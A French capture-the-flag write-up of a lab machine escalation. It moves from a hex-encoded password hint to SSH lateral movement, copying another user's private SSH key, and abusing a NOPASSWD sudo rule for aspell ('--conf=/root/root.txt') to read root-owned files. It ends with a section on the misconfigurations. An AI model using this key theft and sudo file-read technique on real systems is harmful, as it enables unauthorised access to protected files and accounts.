# Yer a Wizard #2

## Flag

```text
EPI{********}
```

---

## 1. Périmètre et objectif

**Cible :** `10.10.0.44`
**Date :** 22 septembre 2026
**Objectif :** récupérer le fichier `root.txt`.

L'accès initial à la machine avec l'utilisateur `hagrid` avait été obtenu lors du challenge précédent et est utilisé comme point de départ.

La méthodologie suivie repose sur :

* l'inspection des permissions de fichiers ;
* l'analyse d'un indice encodé en hexadécimal ;
* l'utilisation d'identifiants pour effectuer un mouvement latéral ;
* l'exploitation de permissions de groupe ;
* la récupération d'une clé SSH privée ;
* l'analyse des permissions `sudo` ;
* l'exploitation de `aspell` autorisé avec les privilèges `root` ;
* le décodage successif de données en hexadécimal, Base64 et Base32.

### Outils utilisés

* `ssh`
* `chmod`
* `cat`
* `ls`
* `sudo`
* `aspell`
* Python
* modules Python `base64`

---

# 2. Énigme de Hagrid

Une fois connecté avec l'utilisateur `hagrid`, le fichier suivant est découvert :

```text
/home/hagrid/riddle.txt
```

Le fichier possède des permissions très restrictives :

```text
000
```

Cependant, son propriétaire est `hagrid`.

Le propriétaire peut donc modifier ses propres permissions afin de pouvoir lire le fichier.

```bash
chmod u+r /home/hagrid/riddle.txt
cat /home/hagrid/riddle.txt
```

Le fichier contient notamment des données hexadécimales.

Une des lignes commence par :

```text
496e20666163742c...
```

Cette valeur est décodée afin de retrouver le texte ASCII correspondant.

Le résultat est :

```text
In fact, this was simple, truly, the password is ByMerlinBeard!
```

Un mot de passe est donc récupéré :

```text
ByMerlinBeard!
```

---

# 3. Mouvement latéral vers Dumbledore

Le mot de passe récupéré est testé sur les comptes susceptibles d'être concernés.

Une tentative de connexion avec `harry` échoue.

En revanche, la connexion avec `dumbledore` fonctionne :

```bash
ssh dumbledore@10.10.0.44
```

Une vérification de l'utilisateur courant permet de confirmer l'accès :

```bash
id
```

Résultat :

```text
uid=1002(dumbledore) gid=1002(dumbledore) groups=1002(dumbledore),1003(headmaster)
```

L'utilisateur `dumbledore` appartient notamment au groupe :

```text
headmaster
```

Cette appartenance devient intéressante pour l'accès aux fichiers de `harry`.

Après l'exploitation du fichier `riddle.txt`, ses permissions originales `000` ont été restaurées.

```bash
chmod 000 /home/hagrid/riddle.txt
```

---

# 4. Énumération du répertoire de Harry

L'appartenance au groupe `headmaster` permet de traverser le répertoire de `harry`.

Le contenu du répertoire `.ssh` est ensuite inspecté :

```bash
ls -la /home/harry/.ssh
```

Un fichier de clé privée SSH est découvert :

```text
id_ed25519
```

Les permissions observées permettent à `dumbledore` d'accéder à cette clé.

La configuration `sudo` de `harry` est également inspectée :

```bash
cat /etc/sudoers.d/harry
```

Le résultat est :

```text
harry ALL=(root) NOPASSWD: /usr/bin/aspell
```

Cette règle indique que `harry` peut exécuter :

```text
/usr/bin/aspell
```

avec les privilèges `root`, sans fournir de mot de passe.

---

# 5. Accès au compte Harry

La clé privée SSH de `harry` est temporairement copiée dans `/tmp`.

Le client SSH exigeant généralement des permissions restrictives sur une clé privée, les permissions du fichier sont modifiées :

```bash
cp /home/harry/.ssh/id_ed25519 /tmp/harry-key
chmod 600 /tmp/harry-key
```

La clé est ensuite utilisée pour se connecter à `harry` :

```bash
ssh -i /tmp/harry-key -o BatchMode=yes harry@localhost 'id; sudo -n -l'
```

La sortie confirme l'accès au compte ainsi que le droit `sudo` :

```text
uid=1001(harry) gid=1001(harry) groups=1001(harry)

User harry may run the following commands on hogwarts:
    (root) NOPASSWD: /usr/bin/aspell
```

Nous disposons donc maintenant d'une exécution de `aspell` avec les privilèges `root`.

---

# 6. Analyse du comportement de `aspell`

L'objectif est désormais de déterminer comment utiliser le droit `sudo` pour accéder à `root.txt`.

Une première tentative avec `aspell -c` ne permet pas d'afficher directement le contenu recherché, car cette fonctionnalité traite le fichier comme un texte à corriger et n'affiche que les mots considérés comme incorrects.

Une autre fonctionnalité de `aspell` permet cependant de charger un fichier comme fichier de configuration.

La syntaxe suivante est testée :

```bash
sudo -n aspell --conf=/tmp/testconfig dump config 2>&1
```

Pour contrôler le comportement, un fichier de test est d'abord créé :

```bash
printf EPItestflag > /tmp/testconfig
```

Puis `aspell` est exécuté dessus :

```bash
sudo -n aspell --conf=/tmp/testconfig dump config 2>&1
```

Le programme retourne :

```text
Error: /tmp/testconfig:1: The key "epitestflag" is unknown.
```

Cette erreur confirme que `aspell` lit effectivement le contenu du fichier fourni avec `--conf`.

Cette fonctionnalité peut donc être utilisée pour lire indirectement un fichier auquel `harry` n'a normalement pas accès.

---

# 7. Lecture de `/root/root.txt`

Le fichier cible est :

```text
/root/root.txt
```

Il est fourni directement comme fichier de configuration à `aspell` :

```bash
sudo -n aspell --conf=/root/root.txt dump config 2>&1
```

Le programme retourne une erreur contenant le contenu du fichier sous la forme d'une longue chaîne hexadécimale :

```text
Error: /root/root.txt:1: The key "53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d" is unknown.
```

La chaîne récupérée est alors analysée.

---

# 8. Décodage du flag

La donnée présente plusieurs niveaux d'encodage.

L'analyse montre la chaîne suivante :

```text
Hexadecimal → Base64 → Base32 → ASCII
```

Un script Python est utilisé pour automatiser les différents décodages :

```python
import base64

s = "53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d"

b64 = bytes.fromhex(s).decode()
b32 = base64.b64decode(b64)

print(base64.b32decode(b32).decode())
```

Les différentes étapes sont :

### Étape 1 — Hexadécimal

```python
b64 = bytes.fromhex(s).decode()
```

La chaîne hexadécimale devient une chaîne encodée en Base64.

### Étape 2 — Base64

```python
b32 = base64.b64decode(b64)
```

Le résultat devient une donnée encodée en Base32.

### Étape 3 — Base32

```python
base64.b32decode(b32).decode()
```

Le résultat final est :

```text
EPI{********}
```

Le flag `root.txt` est donc récupéré.

---

# 9. Nettoyage

Les fichiers temporaires créés pendant l'exploitation sont supprimés :

```bash
rm /tmp/harry-key
rm /tmp/testconfig
```

La clé privée de `harry` n'est donc pas conservée dans `/tmp` après l'exploitation.

---

# 10. Vulnérabilités et mauvaises configurations identifiées

## 10.1 Permissions permettant l'accès à une clé SSH privée

L'utilisateur `dumbledore`, membre du groupe `headmaster`, peut accéder au répertoire `.ssh` de `harry` et à sa clé privée `id_ed25519`.

Cela permet un mouvement latéral vers le compte `harry`.

---

## 10.2 Règle `sudo` trop permissive

La configuration suivante est présente dans `/etc/sudoers.d/harry` :

```text
harry ALL=(root) NOPASSWD: /usr/bin/aspell
```

Cette règle autorise `harry` à exécuter `aspell` avec les privilèges `root`.

Le programme dispose d'une fonctionnalité permettant de charger un fichier arbitraire comme configuration avec :

```text
--conf=<file>
```

Cette fonctionnalité permet alors de lire indirectement le contenu de fichiers protégés.

---

## 10.3 Arbitrary file read via privileged configuration parser

La combinaison :

```text
sudo → aspell → --conf=/root/root.txt
```

permet à un utilisateur non privilégié de faire traiter un fichier appartenant à `root` par un programme exécuté avec les privilèges `root`.

Le contenu du fichier apparaît ensuite dans le message d'erreur généré par `aspell`.

La vulnérabilité peut être décrite comme une **mauvaise configuration de privilèges sudo permettant une lecture arbitraire de fichiers privilégiés via une fonctionnalité légitime du programme**.

---

# 11. Chaîne d'exploitation

```text
hagrid
  │
  ▼
/home/hagrid/riddle.txt
  │
  ▼
chmod u+r
  │
  ▼
Indice hexadécimal
  │
  ▼
ByMerlinBeard!
  │
  ▼
SSH → dumbledore
  │
  ▼
Groupe headmaster
  │
  ▼
/home/harry/.ssh/id_ed25519
  │
  ▼
Clé SSH de harry
  │
  ▼
SSH → harry
  │
  ▼
sudo -n -l
  │
  ▼
(root) NOPASSWD: /usr/bin/aspell
  │
  ▼
aspell --conf=/root/root.txt
  │
  ▼
Chaîne hexadécimale
  │
  ▼
Hex → Base64 → Base32
  │
  ▼
root.txt
  │
  ▼
EPI{********}
```

---

# 12. Résumé

L'exploitation commence avec l'accès `hagrid`. L'analyse de `riddle.txt`, après modification temporaire de ses permissions, permet de récupérer un mot de passe encodé en hexadécimal.

Ce mot de passe permet d'accéder au compte `dumbledore`, qui appartient au groupe `headmaster`. Cette appartenance permet d'accéder au répertoire `.ssh` de `harry` et de récupérer sa clé privée.

L'accès au compte `harry` révèle ensuite une règle `sudo` autorisant l'exécution de `/usr/bin/aspell` en tant que `root` sans mot de passe.

L'analyse du comportement de `aspell` montre que l'option `--conf` peut être utilisée pour faire lire un fichier arbitraire comme configuration. En fournissant `/root/root.txt`, son contenu est exposé dans un message d'erreur.

La donnée récupérée est ensuite décodée successivement en **hexadécimal, Base64 puis Base32**, permettant finalement d'obtenir le flag `root.txt`.

```text
EPI{********}
```
